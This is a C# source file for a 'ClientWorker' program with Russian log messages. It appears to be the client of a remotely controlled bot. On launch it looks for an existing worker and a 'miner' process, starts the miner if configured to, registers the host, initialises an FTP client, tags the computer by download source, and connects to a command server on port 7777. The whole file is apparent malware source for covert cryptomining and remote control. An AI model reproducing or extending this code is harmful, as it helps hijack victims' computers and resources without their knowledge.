using Service;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace ClientWorker
{
    internal class Program
	{
        public static List<Client> Servers = new List<Client>();
        public static string NameProc;
        private static readonly ManualResetEventSlim _OnResponce = new ManualResetEventSlim(false);
        private static string downloadSource = "Name";

        public static void Main(string[] args)
		{
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            if (args.Length > 0 ) 
                downloadSource = args[0];

            try
            {
                OnProgramLoad();
            }catch(Exception ex)
            {
                Log.Send(ex.Message);
            }

            Client netSender = new Client();
            //netSender.Host = "localhost";
            netSender.Host = StartData.currentServer;
            netSender.Port = 7777;
            netSender.Events.OnError = OnError;
            netSender.Events.OnBark = OnBark;
            netSender.Connect(false);
            Servers.Add(netSender);

            _OnResponce.Wait();
        }

        private static void OnBark(int obj)
        {
            Log.Send("OnBark Invoke!");
        }

        private static void OnError(Exception obj)
        {
            Log.Send("OnError Invoke!" + obj.Message);
        }

        private static void OnProgramLoad()
        {
            Log.DetermineLogParth();
            Log.Send("===================================ЗАПУСК===================================");

            if (CheckOtherWorkerAndMiner())
            {
                Environment.Exit(0);
            }            

            NameProc = GetProcessName();
            SetParametrsSetting();
            Functions.Registration();
            FtpClient.Init();
        }

        private static string GetProcessName()
        {
            string result = "";

            try
            {
                string[] array = Application.ExecutablePath.ToString().Split('\\');
                result = array[array.Length - 1];
            }
            catch (Exception ex)
            {
                Log.Send("Ошибка получения имени процесса " + ex.Message);
            }

            return result;
        }

        private static bool CheckOtherWorkerAndMiner()
        {
            bool result = false;

            int num = 0;
            bool isM = false;
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.MainModule.FileVersionInfo.FileDescription == StartData.DescriptionProcess)
                    {
                        num++;
                    }
                    if (process.MainModule.FileVersionInfo.FileDescription == StartData.MProcDescription)
                    {
                        isM = true;
                        MClass.isWorking = true;
                        MClass.MProcess = process;
                        MClass.MProcess.EnableRaisingEvents = true;
                        MClass.MProcess.Exited += new EventHandler(MClass.MExited);
                    }
                }
                catch (Exception ex)
                {
                    Log.Send(ex.Message);
                }
            }

            if (!isM && Service.Properties.Settings.Default.IsMiner)
            {
                try
                {
                    MClass.Start();
                }
                catch (Exception ex) { Log.Send(ex.Message); }
            }


            if (num > 1)
            {
                result = true;
            }
            return result;
        }

        private static void SetParametrsSetting()
        {
            Service.Properties.Settings.Default.Open_sum++;
            Service.Properties.Settings.Default.Start_time = DateTime.Now;          
            if (Service.Properties.Settings.Default.Comp_name == "")
            {
                Service.Properties.Settings.Default.Comp_name = downloadSource + "_" +Service.Properties.Settings.Default.Start_time.ToString();
            }
            if (Service.Properties.Settings.Default.Key == "")
            {
                StartData.GenerateKey();
            }

            Service.Properties.Settings.Default.Save();
        }
    }
}
